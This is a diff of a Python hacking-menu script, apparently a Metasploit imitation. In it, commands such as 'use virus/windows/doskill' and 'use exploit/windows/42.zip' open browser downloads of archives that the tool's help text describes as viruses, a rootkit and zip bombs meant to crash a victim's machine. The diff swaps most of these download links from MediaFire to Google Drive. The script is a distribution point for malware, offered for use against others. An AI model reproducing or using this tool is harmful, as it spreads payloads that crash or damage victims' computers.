@@ -156,31 +156,31 @@ use exploit/windows/zblg.zip : create an infinite unzip block to crash the victi
 use exploit/windows/42.zip : create a windows file bug crashing the victim's machine\n\
 ----------------------------------------------------------------------------------------------------------------------------")
 	elif user_command == "use virus/windows/destsys":
-	    webbrowser.open("https://www.mediafire.com/file/5dbzzb06t3djkm9/brdl.rar/file")
+	    webbrowser.open("https://drive.google.com/file/d/1YqJIBtKU1H2LnNyH4QmjoNhLdv0WbLMV/view?usp=drive_link")
 	elif user_command == "use virus/windows/desteye":
-	    webbrowser.open("https://www.mediafire.com/file/gsjdvx99vfqtt60/setup.rar/file")
+	    webbrowser.open("https://drive.google.com/file/d/1Ggkfu3aubyc83v9CEeGmP_JtB9DBigkU/view?usp=drive_link")
 	elif user_command == "use virus/windows/doskill":
-	    webbrowser.open("https://www.mediafire.com/file/11do04sp0ya9khg/setup.rar/file")
+	    webbrowser.open("https://drive.google.com/file/d/1xuzf70ta2_tR9X5U35mXsfgkKrezsJei/view?usp=drive_link")
 	elif user_command == "use virus/windows/doscr":
-	    webbrowser.open("https://www.mediafire.com/file/iyz0fmmpsgzi0r3/setup_2.rar/file")
+	    webbrowser.open("https://drive.google.com/file/d/1eH9TKFDlkbjLy54EHGdXQkcUV4g0DO7u/view?usp=drive_link")
 	elif user_command == "use virus/windows/crwin":
 	    webbrowser.open("https://www.mediafire.com/file/mubnwp94clnu2ex/setup3.rar/file")
 	elif user_command == "use":
 	    print("error : please enter the path to the target exploit or virus")
 	    print("do /exvir help to get the different paths")
 	elif user_command == "use virus/windows/splert":
-	    webbrowser.open("https://www.mediafire.com/file/rcd0yvwjhg2n0nm/splert.rar/file")
+	    webbrowser.open("https://drive.google.com/file/d/1f1z2qNXHVDIG9qkkuOXTRgF7AhlMa82D/view?usp=drive_link")
 	elif user_command == "use exploit/windows/rootkey":
-	    webbrowser.open("https://www.mediafire.com/file/gw6d2y7vae62za9/rootkitpass.zip/file")
+	    webbrowser.open("https://drive.google.com/file/d/1iOGAGQyXBbocQ7kpU-gpcQXJnswP0lrC/view?usp=drive_link")
 	elif user_command == "use virus/windows/spail":
-	    webbrowser.open("https://www.mediafire.com/file/k7hnt7ahu2t2j1v/spail.rar/file")
+	    webbrowser.open("https://drive.google.com/file/d/1SnrOzkPHKdIotY8mPBLm1J0J6DLB8nNK/view?usp=drive_link")
 	elif user_command == "use exploit/windows/zbxl.zip":
-	    webbrowser.open("https://www.mediafire.com/file/zm6ziqkz5yk9ixc/zbxl.zip/file")
+	    webbrowser.open("https://drive.google.com/file/d/1mmtFQfKERT92eW41UJxhcELijgEsiu2I/view?usp=drive_link")
 	elif user_command == "use exploit/windows/zbsm.zip":
-	    webbrowser.open("https://www.mediafire.com/file/smttkzakj4sy7a6/zbsm.zip/file")
+	    webbrowser.open("https://drive.google.com/file/d/1Gj40sOcx-iWrDTgDG4t700uR0Uac0UI7/view?usp=drive_link")
 	elif user_command == ("use exploit/windows/zblg.zip"):
-	    webbrowser.open("https://www.mediafire.com/file/mb3fo0gztvqr89n/zblg.zip/file")
+	    webbrowser.open("https://drive.google.com/file/d/1Mrr7gt5IIRNqmVN2eb0ygvZBVVfLYKDQ/view?usp=drive_link")
 	elif user_command == ("use exploit/windows/42.zip"):
-	    webbrowser.open("https://www.mediafire.com/file/73xb0kp9ub6dgqu/42.zip/file")
+	    webbrowser.open("https://drive.google.com/file/d/1Z4mJiEE0FQ-pHHx5dG9nRG-iX90hyEUH/view?usp=drive_link")
 	else:
 		print("error : command not found, do /help if you are lost")
